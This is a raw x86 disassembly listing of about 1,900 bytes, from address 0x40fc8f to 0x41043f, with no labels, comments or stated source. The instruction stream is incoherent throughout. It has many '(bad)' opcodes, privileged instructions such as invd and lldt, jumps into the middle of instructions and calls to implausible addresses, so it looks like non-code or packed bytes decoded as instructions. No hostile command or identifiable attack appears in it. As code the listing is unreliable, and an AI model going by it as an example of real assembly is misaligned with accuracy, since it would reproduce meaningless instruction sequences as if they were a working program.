  40fc8f:	dec    DWORD PTR [ebx+0x45510cf4]
  40fc95:	mov    DWORD PTR [ebx+0x5645fc0c],ecx
  40fc9b:	mov    edx,DWORD PTR [ecx+0xc]
  40fc9e:	xor    eax,esi
  40fca0:	mov    edx,0xc172c7
  40fca5:	inc    ebp
  40fca6:	mov    esi,DWORD PTR [ebp+0x8]
  40fca9:	mov    eax,edx
  40fcab:	call   0x84c5c3a0
  40fcb0:	add    DWORD PTR [ebp-0x76bace00],ebx
  40fcb6:	mov    ebp,eax
  40fcb8:	or     BYTE PTR [eax],dl
  40fcba:	jo     0x40fd09
  40fcbc:	push   edi
  40fcbd:	xor    esi,DWORD PTR [ebp+0x3]
  40fcc0:	(bad)  
  40fcc1:	pmulhuw mm0,mm1
  40fcc4:	test   DWORD PTR [ebp-0x8],ecx
  40fcc7:	mov    DWORD PTR [ebp-0x67],eax
  40fcca:	mov    eax,DWORD PTR [ebp-0x4]
  40fccd:	xor    edi,DWORD PTR [ebp-0x73]
  40fcd0:	xor    eax,DWORD PTR [ebx]
  40fcd2:	xor    esi,DWORD PTR [edx+0x3]
  40fcd5:	add    BYTE PTR [ecx],bh
  40fcd7:	inc    ebp
  40fcd8:	(bad)  
  40fcd9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fcdf:	mov    DWORD PTR [eax],0x750f0004
  40fce5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fceb:	lock add BYTE PTR [ebp+0x0],al
  40fcef:	mov    esi,DWORD PTR [ebp-0x2c]
  40fcf2:	mov    ebp,edx
  40fcf4:	or     al,0x72
  40fcf6:	ja     0x40fcf8
  40fcf8:	mov    edx,esi
  40fcfa:	cld    
  40fcfb:	(bad)  
  40fcfe:	cli    
  40fcff:	mov    esi,DWORD PTR [ebp-0x4]
  40fd02:	cmp    ecx,esi
  40fd04:	bswap  edi
  40fd06:	(bad)
  40fd0a:	mov    esi,DWORD PTR [ebp-0x4]
  40fd0d:	mov    esi,ecx
  40fd0f:	clc    
  40fd10:	repnz add esi,DWORD PTR [ebp+0x45]
  40fd14:	push   ebx
  40fd15:	xor    eax,DWORD PTR [ebp+0x3]
  40fd18:	xor    BYTE PTR [edi-0x64],bl
  40fd1b:	pop    ebx
  40fd1c:	jmp    0x40fde3
  40fd21:	mov    esi,DWORD PTR [ebp-0x7d]
  40fd24:	xor    ebp,DWORD PTR [eax]
  40fd26:	lea    eax,[ebp-0x8]
  40fd29:	xor    eax,0xc7ef9cf2
  40fd2e:	neg    eax
  40fd30:	ins    DWORD PTR es:[edi],dx
  40fd31:	test   esi,edi
  40fd33:	clc    
  40fd34:	pop    esp
  40fd35:	inc    ebp
  40fd36:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fd3c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fd42:	add    cl,al
  40fd44:	jne    0x40fce3
  40fd46:	mov    esi,DWORD PTR [edx]
  40fd48:	in     al,dx
  40fd49:	push   esi
  40fd4a:	xor    BYTE PTR [ebp-0xe],dh
  40fd4d:	add    edi,esi
  40fd4f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fd55:	add    cl,bh
  40fd57:	mov    edi,DWORD PTR [ebp+0x8]
  40fd5a:	mov    DWORD PTR [ebp-0x14],esi
  40fd5d:	add    esi,DWORD PTR [ebp+0x3c]
  40fd60:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fd66:	mov    ah,0x3e
  40fd68:	popf   
  40fd69:	pushf  
  40fd6a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fd70:	jne    0x40fcfd
  40fd72:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fd75:	icebp  
  40fd76:	icebp  
  40fd77:	shl    edx,0xf2
  40fd7a:	(bad)  
  40fd7b:	mov    ah,0x16
  40fd7d:	pusha  
  40fd7e:	jne    0x40fd13
  40fd80:	mov    ecx,DWORD PTR [edi]
  40fd82:	in     al,dx
  40fd83:	jmp    0x40fd76
  40fd85:	add    dl,dh
  40fd87:	mov    edi,esi
  40fd89:	or     al,0x8
  40fd8b:	inc    ebp
  40fd8c:	jne    0x40fd91
  40fd8e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fd94:	ret    
  40fd95:	or     bh,bh
  40fd97:	jge    0x40fd81
  40fd99:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fd9f:	xor    edi,eax
  40fda1:	add    esi,DWORD PTR [ebp-0x77]
  40fda4:	mov    ebx,esp
  40fda6:	clc    
  40fda7:	neg    DWORD PTR [ebp-0x7c]
  40fdaa:	xor    eax,DWORD PTR [eax]
  40fdac:	cmp    eax,DWORD PTR [eax]
  40fdae:	repz jne 0x40fd46
  40fdb1:	xor    eax,DWORD PTR [ecx]
  40fdb3:	add    ebx,DWORD PTR [eax]
  40fdb5:	mov    DWORD PTR [ebp-0x8],eax
  40fdb8:	mov    eax,edi
  40fdba:	cld    
  40fdbb:	lock pop eax
  40fdbd:	test   DWORD PTR [ebx],esi
  40fdbf:	clc    
  40fdc0:	add    edx,DWORD PTR [edi-0x740bff77]
  40fdc6:	fdivp  st(4),st
  40fdc8:	test   ecx,esi
  40fdca:	(bad)  
  40fdcb:	jnp    0x40fdcc
  40fdcd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fdd3:	jae    0x40fd60
  40fdd5:	sub    edi,esp
  40fdd7:	(bad)  
  40fdd8:	shl    DWORD PTR [eax-0x3e],0x89
  40fddc:	leave  
  40fddd:	call   0x8196b4ea
  40fde2:	in     al,dx
  40fde3:	(bad)  
  40fde4:	in     al,dx
  40fde5:	add    bh,al
  40fde7:	mov    esp,edi
  40fde9:	in     al,dx
  40fdea:	test   DWORD PTR [ebp-0x8],edi
  40fded:	mov    eax,DWORD PTR [ebp+0x2b]
  40fdf0:	xor    al,BYTE PTR [ebx]
  40fdf2:	pushf  
  40fdf3:	jnp    0x572ffa2c
  40fdf9:	xor    edx,DWORD PTR [esi-0x77]
  40fdfc:	push   ecx
  40fdfd:	loopne 0x40fe32
  40fdff:	jne    0x40fdbc
  40fe01:	mov    esi,DWORD PTR [edx-0x20]
  40fe04:	add    BYTE PTR [ebp-0x3d],bh
  40fe07:	xor    eax,DWORD PTR [ebp-0x73]
  40fe0a:	mov    edi,DWORD PTR [esi]
  40fe0c:	cld    
  40fe0d:	jb     0x40fdd5
  40fe0f:	add    bl,al
  40fe11:	jne    0x40fe58
  40fe13:	mov    edx,DWORD PTR [edi-0x10]
  40fe16:	jge    0x40fe95
  40fe18:	mov    esi,DWORD PTR [ebx]
  40fe1a:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fe1e:	xor    esi,DWORD PTR [ebp-0x77]
  40fe21:	mov    esi,eax
  40fe23:	lock inc ebp
  40fe25:	jge    0x40fe5c
  40fe27:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fe2e:	dec    ebp
  40fe2f:	mov    esi,DWORD PTR [ebx]
  40fe31:	loopne 0x40fdbc
  40fe33:	jge    0x40fe2d
  40fe35:	add    DWORD PTR [ebp-0x7d],eax
  40fe38:	cmc    
  40fe39:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fe40:	dec    ebp
  40fe41:	hlt    
  40fe42:	xor    ebx,DWORD PTR [ebp-0x77]
  40fe45:	mov    esi,esp
  40fe47:	in     al,0x45
  40fe49:	jge    0x40fe7c
  40fe4b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fe52:	dec    ebp
  40fe53:	xor    edx,DWORD PTR fs:[ebx+0x3ec7389]
  40fe5a:	inc    ebp
  40fe5b:	hlt    
  40fe5c:	xor    eax,0xb88b9f75
  40fe61:	add    al,0x95
  40fe63:	icebp  
  40fe64:	add    dl,dh
  40fe66:	mov    DWORD PTR [ebp+0x20],ebx
  40fe69:	cmp    eax,DWORD PTR [ebp+0xf]
  40fe6c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fe70:	fistp  WORD PTR [ebx+0x0]
  40fe73:	inc    ebp
  40fe74:	mov    ebx,DWORD PTR [edi+0xc]
  40fe77:	add    eax,eax
  40fe79:	inc    ebp
  40fe7a:	test   BYTE PTR [ebx],dh
  40fe7c:	add    eax,DWORD PTR [ebx]
  40fe7e:	add    BYTE PTR [esi+0x45],bl
  40fe81:	ret    0x85
  40fe84:	jnp    0x54418253
  40fe8a:	inc    bp
  40fe8c:	inc    ebp
  40fe8d:	xor    eax,0xc78a9cb9
  40fe92:	add    ah,bl
  40fe94:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  40fe9a:	add    BYTE PTR [ebx+0x3],dl
  40fe9d:	mov    esi,0x708088b
  40fea2:	cmp    esi,eax
  40fea4:	setge  BYTE PTR [ecx-0x74fcffce]
  40feab:	mov    esp,edi
  40fead:	call   0x33cc43ff
  40feb2:	or     BYTE PTR [ebx],al
  40feb4:	inc    ecx
  40feb5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40febb:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fec1:	lock add cl,al
  40fec4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fecb:	mov    ch,0x45
  40fecd:	clc    
  40fece:	xor    eax,DWORD PTR [ebp+0x3]
  40fed1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fed7:	inc    ebp
  40fed8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fede:	mov    edi,eax
  40fee0:	mov    eax,DWORD PTR [ebp+0x3c]
  40fee3:	mov    ecx,DWORD PTR [eax]
  40fee5:	hlt    
  40fee6:	inc    ebp
  40fee7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40feee:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fef4:	push   ebp
  40fef5:	mov    edi,DWORD PTR [ebx]
  40fef7:	in     al,dx
  40fef8:	jne    0x40febb
  40fefa:	mov    eax,DWORD PTR [ebp-0x28]
  40fefd:	add    DWORD PTR [eax],0xe8058dec
  40ff03:	clc    
  40ff04:	mov    eax,DWORD PTR [edi]
  40ff06:	clc    
  40ff07:	add    dh,dl
  40ff09:	rol    WORD PTR [ebp-0x1],cl
  40ff0d:	mov    edx,DWORD PTR [eax+0x8]
  40ff10:	jne    0x40fed2
  40ff12:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40ff19:	inc    ebp
  40ff1a:	push   esp
  40ff1b:	test   DWORD PTR [ecx+0xf],ecx
  40ff1e:	sub    edx,esp
  40ff20:	add    eax,DWORD PTR [eax]
  40ff22:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40ff28:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40ff2f:	mov    eax,DWORD PTR [ecx]
  40ff31:	and    BYTE PTR [eax],al
  40ff33:	inc    eax
  40ff34:	adc    BYTE PTR [eax],al
  40ff36:	inc    ebp
  40ff37:	inc    cx
  40ff3a:	push   esp
  40ff3b:	push   es
  40ff3c:	jne    0x40ff3e
  40ff3e:	push   edx
  40ff3f:	enterw 0xc1,0x4d
  40ff44:	mov    esp,DWORD PTR [esi+0x20]
  40ff47:	add    DWORD PTR [ecx-0x7b],eax
  40ff4a:	add    eax,DWORD PTR [ebx]
  40ff4c:	str    WORD PTR [eax+0x45]
  40ff50:	lea    ecx,[ebx+0x45890801]
  40ff56:	sbb    BYTE PTR [ebx],al
  40ff58:	dec    ebp
  40ff59:	cmp    al,0xf
  40ff5b:	inc    ebp
  40ff5c:	push   eax
  40ff5d:	mov    esi,DWORD PTR [ebx]
  40ff5f:	push   eax
  40ff60:	add    eax,eax
  40ff62:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40ff69:	inc    ebp
  40ff6a:	add    BYTE PTR ds:0x8b4d8c00,dh
  40ff70:	xor    edx,esp
  40ff72:	add    eax,esi
  40ff74:	mov    ebx,eax
  40ff76:	loopne 0x40ffbd
  40ff78:	dec    ebp
  40ff79:	mov    ecx,DWORD PTR [edi]
  40ff7b:	cld    
  40ff7c:	push   eax
  40ff7d:	xchg   DWORD PTR [ebx],esi
  40ff7f:	add    DWORD PTR [ebx],ebp
  40ff81:	add    BYTE PTR [ebx],ch
  40ff83:	or     BYTE PTR [ecx],bh
  40ff85:	dec    ecx
  40ff86:	loopne 0x40ff8b
  40ff88:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40ff8e:	push   ebp
  40ff8f:	add    DWORD PTR [ebx+0x55100800],eax
  40ff95:	dec    ebp
  40ff96:	jmp    0x40ff21
  40ff98:	mov    esp,DWORD PTR [eax]
  40ff9a:	sbb    dl,dl
  40ff9c:	inc    eax
  40ff9d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40ffa3:	add    BYTE PTR [ebx+0x74528555],cl
  40ffa9:	push   ebp
  40ffaa:	div    DWORD PTR [ebx]
  40ffac:	and    eax,DWORD PTR [ebx]
  40ffae:	add    edx,DWORD PTR [edx-0x30]
  40ffb1:	jno    0x40ff3e
  40ffb3:	inc    DWORD PTR [eax+eiz*1]
  40ffb6:	inc    ebp
  40ffb7:	push   eax
  40ffb8:	push   eax
  40ffb9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40ffbf:	mov    edi,esp
  40ffc1:	push   eax
  40ffc2:	inc    ebp
  40ffc3:	enter  0x458b,0x8
  40ffc7:	push   ecx
  40ffc8:	(bad)  
  40ffc9:	call   0x10b09a1
  40ffce:	pop    ss
  40ffcf:	push   ebp
  40ffd0:	mov    ecx,DWORD PTR [ebx+0x489408]
  40ffd6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40ffdc:	push   ecx
  40ffdd:	jo     0x40ffc7
  40ffdf:	inc    DWORD PTR [edi]
  40ffe1:	or     BYTE PTR [eax],al
  40ffe3:	call   0xcc072d
  40ffe8:	fmul   QWORD PTR [ebp+0x55]
  40ffeb:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fff1:	mov    bh,0x8c
  40fff3:	adc    al,0x9d
  40fff5:	dec    esp
  40fff6:	xor    bl,BYTE PTR [eax]
  40fff8:	mov    ecx,DWORD PTR [ebp+0xc]
  40fffb:	mov    eax,DWORD PTR [ebp-0x4]
  40fffe:	mov    esi,DWORD PTR [edi-0x3148f924]
  410004:	push   es
  410005:	retf   
  410006:	mov    BYTE PTR [ebp-0x30],0x3b
  41000a:	inc    ebp
  41000b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  410012:	retf   0x83fc
  410015:	into   
  410016:	dec    ebp
  410017:	retf   
  410018:	mov    ecx,DWORD PTR [ebp-0x74]
  41001b:	mov    eax,DWORD PTR [eax]
  41001d:	fdiv   QWORD PTR [ebx]
  41001f:	mov    bh,0x3
  410021:	push   es
  410022:	mov    esi,ecx
  410024:	sbb    cl,dl
  410026:	dec    ebp
  410027:	sar    DWORD PTR [ebx],cl
  410029:	push   ebp
  41002a:	jne    0x41003b
  41002c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  410032:	lea    ebx,[eax]
  410034:	call   0xf4ca8bfb
  410039:	sbb    dh,dl
  41003b:	add    edx,ebx
  41003d:	push   ebp
  41003e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  410044:	push   ecx
  410045:	mov    DWORD PTR [eax-0x30],edx
  410048:	test   DWORD PTR [edx],eax
  41004a:	xadd   esp,esi
  41004d:	pop    es
  41004e:	add    cl,dl
  410050:	mov    eax,ecx
  410052:	or     al,0x45
  410054:	(bad)  
  410055:	push   eax
  410056:	add    DWORD PTR [edx+0x0],eax
  410059:	add    ecx,DWORD PTR [ecx]
  41005b:	and    dh,cl
  41005d:	call   0xc5092d
  410062:	add    DWORD PTR [ebp+0x0],edx
  410065:	mov    esp,DWORD PTR [ebp+0x18]
  410068:	add    BYTE PTR [eax+0x28],cl
  41006b:	xor    eax,DWORD PTR [eax]
  41006d:	add    esp,DWORD PTR [esi+0x3b]
  410070:	inc    ebp
  410071:	je     0x40fff6
  410073:	push   ecx
  410074:	push   es
  410075:	dec    ebp
  410076:	mov    DWORD PTR [ebx],eax
  410078:	(bad)  
  410079:	or     al,0x1e
  41007b:	inc    eax
  41007c:	add    BYTE PTR [ebx],al
  41007e:	data16 and BYTE PTR [ebp+0x50],al
  410082:	sub    DWORD PTR [ecx],0x8
  410085:	add    BYTE PTR [ebp-0x75],ah
  410088:	add    BYTE PTR [eax],bl
  41008a:	enter  0x894d,0x8b
  41008e:	int3   
  41008f:	loopne 0x41004b
  410091:	rol    BYTE PTR [eax],0x33
  410094:	lea    cx,[ebp+0xa]
  410098:	data16 jb 0x4100e0
  41009b:	add    BYTE PTR [ebx+0x44890855],cl
  4100a1:	sbb    ah,al
  4100a3:	inc    ebp
  4100a4:	inc    eax
  4100a5:	lldt   WORD PTR [edx+0x66]
  4100a9:	xor    ecx,DWORD PTR [eax]
  4100ab:	sub    eax,DWORD PTR [esi]
  4100ad:	mov    eax,DWORD PTR [eax]
  4100af:	or     al,0x66
  4100b1:	ror    edx,cl
  4100b3:	dec    ebp
  4100b4:	inc    ebp
  4100b5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4100bb:	cld    
  4100bc:	or     BYTE PTR [edi+0x4501dd],dl
  4100c2:	retf   0xe0ce
  4100c5:	retf   
  4100c6:	(bad)  
  4100c7:	dec    ebp
  4100c8:	mov    al,0x8b
  4100ca:	in     al,dx
  4100cb:	and    BYTE PTR [ebx],dh
  4100cd:	or     al,BYTE PTR [ebp+0x27]
  4100d0:	in     al,dx
  4100d1:	xchg   eax,esp
  4100d3:	add    edi,eax
  4100d5:	add    BYTE PTR [eax+0x3f52ed55],bh
  4100db:	push   ebp
  4100dc:	inc    ebp
  4100dd:	xor    edx,edx
  4100df:	add    esp,eax
  4100e1:	push   edx
  4100e2:	push   bp
  4100e4:	inc    ebp
  4100e5:	jmp    ecx
  4100e7:	push   esp
  4100e8:	(bad)  
  4100e9:	inc    edx
  4100eb:	sbb    al,0x33
  4100ed:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4100f4:	add    BYTE PTR [ebp+0x48],0x8b
  4100f8:	jmp    0xf98b:0x100041c8
  4100ff:	xor    esi,DWORD PTR [edx+0x3]
  410102:	mov    ecx,DWORD PTR [edi]
  410104:	fmul   DWORD PTR [edx]
  410106:	add    BYTE PTR [eax],al
  410108:	lea    eax,[ebx-0x4700273c]
  41010e:	add    al,0x4f
  410110:	pop    DWORD PTR [eax]
  410112:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  410118:	push   edx
  410119:	inc    WORD PTR [ebp+0x8]
  41011d:	mov    eax,0x514f4d
  410122:	(bad)
  410126:	add    al,al
  410128:	xor    DWORD PTR [ebx-0x74baf730],eax
  41012e:	test   DWORD PTR [esi+0x74],esp
  410131:	inc    ebp
  410132:	mov    DWORD PTR [eax+0xa4e08],edi
  410138:	add    BYTE PTR [ecx-0x76c435bb],cl
  41013e:	or     dh,cl
  410140:	or     eax,0x8b8d5045
  410145:	inc    ebp
  410146:	mov    WORD PTR [ecx+0x3b8a00],?
  41014c:	jne    0x410181
  41014e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  410154:	add    DWORD PTR [ebx],eax
  410156:	add    bh,bh
  410158:	adc    DWORD PTR [eax],ecx
  41015a:	adc    DWORD PTR [ebp+0x55],edi
  41015d:	push   es
  41015e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410164:	mov    ebp,DWORD PTR [eax+ebp*1+0x503411d2]
  41016b:	inc    ebp
  41016c:	mov    edx,edi
  41016e:	or     al,0xd2
  410170:	push   eax
  410171:	(bad)  
  410172:	jne    0x410128
  410174:	call   0x28fa5b
  410179:	inc    ebp
  41017a:	shl    BYTE PTR [esp+eax*4],0xe0
  41017e:	add    bh,al
  410180:	add    BYTE PTR [ebp+esi*2-0x2c742e],bh
  410187:	(bad)  
  410188:	and    al,al
  41018a:	fs loope 0x41018c
  41018d:	inc    ebp
  41018e:	test   DWORD PTR [esi+0xf],edi
  410191:	leave  
  410192:	scas   al,BYTE PTR es:[edi]
  410193:	inc    esp
  410194:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41019b:	or     BYTE PTR [ebx-0x97717ca],0x83
  4101a2:	call   DWORD PTR [edi]
  4101a4:	shr    ah,0x84
  4101a7:	xchg   DWORD PTR [eax],eax
  4101a9:	add    DWORD PTR [eax],eax
  4101ab:	add    bh,bh
  4101ad:	dec    ebp
  4101ae:	and    BYTE PTR [ecx-0x38],dl
  4101b1:	push   eax
  4101b2:	dec    DWORD PTR [ebx+0xfd885]
  4101b8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4101be:	mov    WORD PTR [ecx+0x0],ss
  4101c1:	lea    ecx,[ebx+0x108b20d8]
  4101c7:	mov    WORD PTR [edx],ds
  4101c9:	add    BYTE PTR [edi+0xff01ff],al
  4101cf:	mov    ecx,DWORD PTR [ebp-0x28]
  4101d2:	push   ecx
  4101d3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4101d7:	inc    ebp
  4101d8:	in     al,0xeb
  4101da:	jno    0x410167
  4101dc:	push   edx
  4101dd:	mov    DWORD PTR [eax-0x28],edx
  4101e0:	mov    eax,DWORD PTR [ebp+0x20]
  4101e3:	je     0x41016c
  4101e5:	mov    eax,DWORD PTR [ecx]
  4101e7:	sbb    BYTE PTR [eax],al
  4101e9:	pop    DWORD PTR [eax]
  4101eb:	add    esi,eax
  4101ed:	add    bl,al
  4101ef:	adc    DWORD PTR [edi],esi
  4101f1:	jmp    0x8bcc5243
  4101f6:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4101fd:	jne    0x41018a
  4101ff:	mov    ecx,DWORD PTR [eax]
  410201:	in     al,0x75
  410203:	pop    DWORD PTR [ecx+0x5601]
  410209:	push   edx
  41020a:	inc    DWORD PTR [ebx]
  41020c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  410212:	add    BYTE PTR [edi+0x9],dl
  410215:	call   DWORD PTR [esi]
  410217:	and    dl,al
  410219:	and    bh,bh
  41021b:	inc    edi
  41021d:	test   eax,edx
  41021f:	sldt   ebx
  410222:	xor    al,BYTE PTR [eax]
  410224:	pushf  
  410225:	(bad)  
  410226:	jmp    0x410234
  410228:	mov    eax,edi
  41022a:	or     al,0x75
  41022c:	inc    eax
  41022d:	call   0x40f935
  410232:	mov    eax,eax
  410234:	loopne 0x4101ba
  410236:	inc    ebp
  410237:	add    BYTE PTR [ebx+0x1451c00],cl
  41023d:	mov    eax,DWORD PTR [ebp+0x20]
  410240:	add    edi,ecx
  410242:	add    BYTE PTR [eax],ch
  410244:	cmp    edi,0x18
  410247:	test   DWORD PTR [ebp+0xf],esi
  41024a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  410251:	jne    0x410255
  410253:	call   0xff9ffd18
  410258:	leave  
  410259:	rcr    BYTE PTR [esp+eax*4],0x55
  41025d:	add    ah,ch
  41025f:	add    BYTE PTR [edi-0x48fef979],dh
  410265:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41026c:	inc    esp
  41026d:	mov    ebx,DWORD PTR [eax]
  41026f:	fcom   st(2)
  410271:	add    BYTE PTR [edi],bl
  410273:	lea    ecx,[eax-0x18]
  410276:	(bad)  
  410277:	push   DWORD PTR [ecx]
  410279:	call   0xffb34fdb
  41027e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  410282:	fstp   DWORD PTR [esi+ebx*8]
  410285:	push   ebp
  410286:	pop    ebp
  410287:	mov    esi,DWORD PTR [edx-0x38]
  41028a:	add    DWORD PTR [eax],0x28
  41028d:	mov    edi,DWORD PTR [ebx]
  41028f:	xor    esi,DWORD PTR [edx+0x3]
  410292:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410296:	pop    ebp
  410297:	or     al,0x4
  410299:	inc    ecx
  41029a:	push   ebp
  41029b:	(bad)  
  41029c:	in     al,dx
  41029d:	or     ah,ch
  41029f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a0:	xbegin 0xffc67896
  4102a6:	clc    
  4102a7:	adc    al,0x45
  4102a9:	div    BYTE PTR [edx]
  4102ab:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4102b2:	test   DWORD PTR [ebp+0x661b00f8],ebx
  4102b8:	add    BYTE PTR [ecx+0x66],dh
  4102bb:	add    eax,DWORD PTR [ebp+0x52]
  4102be:	adc    eax,0x60
  4102c1:	xchg   DWORD PTR [ecx+0x3400fc01],ecx
  4102c7:	test   DWORD PTR [eax],eax
  4102c9:	clc    
  4102ca:	data16 or al,BYTE PTR [ebp+0x45]
  4102ce:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  4102d5:	rol    BYTE PTR [ebp+0x45],1
  4102d8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4102de:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4102e4:	push   ebx
  4102e5:	add    BYTE PTR [esi+0x0],dl
  4102e8:	push   ecx
  4102e9:	jge    0x41031e
  4102eb:	add    BYTE PTR [esi+0x4],dl
  4102ee:	jne    0x410355
  4102f0:	mov    edx,0x457200
  4102f5:	jmp    0x4102b9
  4102f7:	xor    edi,DWORD PTR [ebx]
  4102f9:	pop    edi
  4102fa:	cvtdq2ps xmm7,xmm0
  4102fd:	ret    0x0
  410300:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  410306:	xor    ecx,DWORD PTR [edi]
  410308:	add    eax,DWORD PTR [ecx+0x3b]
  41030b:	push   ebx
  41030c:	rdpmc  
  41030e:	out    0x8d,al
  410310:	add    BYTE PTR [eax],cl
  410312:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  410318:	ret    0x450c
  41031b:	sbb    al,0x8b
  41031d:	cmp    eax,esi
  41031f:	or     cl,al
  410321:	or     al,0xc2
  410323:	pop    eax
  410324:	inc    ebp
  410325:	add    ecx,DWORD PTR [edi]
  410327:	add    esi,DWORD PTR [ebp+0x39]
  41032a:	invd   
  41032c:	jge    0x410338
  41032e:	mov    eax,0x478ac0
  410333:	cli    
  410334:	xor    esp,ecx
  410336:	mov    ebx,0x5b8ac0
  41033b:	ret    0x33
  41033e:	mov    eax,0x833b8b
  410343:	sub    BYTE PTR [ebx],al
  410345:	inc    ebp
  410346:	xor    ax,0x9cf8
  41034a:	inc    bh
  41034c:	mov    esp,esp
  41034e:	hlt    
  41034f:	test   DWORD PTR [ebp-0x8],esi
  410352:	mov    eax,DWORD PTR [ebp-0x14]
  410355:	xor    ecx,DWORD PTR [ebx-0x76478864]
  41035b:	dec    edi
  41035c:	or     BYTE PTR [eax],al
  41035e:	jne    0x4102e9
  410360:	mov    esi,esp
  410362:	call   0x77a78f27
  410367:	inc    ebp
  410368:	mov    DWORD PTR [eax+0x9d4f0c],edi
  41036e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410374:	add    BYTE PTR [esi+0x7d],ah
  410377:	inc    ebp
  410378:	mov    bx,WORD PTR [ebp+0x8]
  41037c:	add    DWORD PTR [ebp+0x56],0x30c008b
  410383:	inc    ebp
  410384:	mov    bx,di
  410387:	lock test BYTE PTR [ecx+0x7000801],bh
  41038e:	jge    0x410351
  410390:	mov    ecx,DWORD PTR [ebx-0x620613f0]
  410396:	cli    
  410397:	xor    bl,bh
  410399:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41039f:	test   BYTE PTR [eax],cl
  4103a1:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4103a8:	cmp    ebp,eax
  4103aa:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4103b1:	test   BYTE PTR [ebp+0x1],bh
  4103b4:	mov    ebx,0x458a00
  4103b9:	xor    esi,DWORD PTR [ebx]
  4103bb:	add    esp,DWORD PTR [esi-0x77]
  4103be:	pop    ebp
  4103bf:	loopne 0x410427
  4103c1:	inc    ebp
  4103c2:	clc    
  4103c3:	xor    edi,DWORD PTR [ebx]
  4103c5:	add    esi,DWORD PTR [edx-0x77]
  4103c8:	data16 fdivr QWORD PTR [ebp-0x49]
  4103cc:	mov    ebx,0xb78afc
  4103d1:	hlt    
  4103d2:	xor    eax,DWORD PTR [eax+0x66]
  4103d5:	add    BYTE PTR [ebp+0x66],bl
  4103d8:	data16 lock clc 
  4103db:	inc    eax
  4103dc:	cmp    eax,DWORD PTR [eax]
  4103de:	ja     0x410446
  4103e0:	psubq  mm7,QWORD PTR [ebp+0x6]
  4103e4:	ltr    WORD PTR [ebp+0x66]
  4103e8:	add    esi,eax
  4103ea:	add    di,WORD PTR [ebp+0x2b]
  4103ee:	data16 data16 jge 0x41046f
  4103f2:	mov    ebx,0xe08a8b
  4103f7:	jge    0x41042c
  4103f9:	data16 data16 xor al,0x5d
  4103fd:	data16 data16 jne 0x4103f9
  410401:	mov    edi,DWORD PTR [ebx]
  410403:	fdiv   QWORD PTR [edx+0x7d]
  410406:	data16 data16 jge 0x41043e
  41040a:	mov    ebx,0x758a66
  41040f:	mov    esi,0x667233
  410414:	pop    ebp
  410415:	or     BYTE PTR [esi+0x0],ah
  410418:	clc    
  410419:	mov    edi,DWORD PTR [ebx]
  41041b:	lock ja 0x4103a9
  41041e:	(bad)  
  410420:	jge    0x410419
  410422:	invd   
  410424:	pop    ebp
  410425:	add    BYTE PTR [ebx],al
  410427:	(bad)  
  410428:	cmp    di,WORD PTR [ebp+0xf]
  41042c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  410430:	mov    bx,WORD PTR [ebp-0x10]
  410434:	pop    bp
  410436:	fbstp  TBYTE PTR [ebx]
  410438:	test   DWORD PTR [ebx],eax
  41043a:	add    BYTE PTR [ebx],bh
  41043c:	add    BYTE PTR [esi+0x7d],ah
  41043f:	jge    0x4103cc
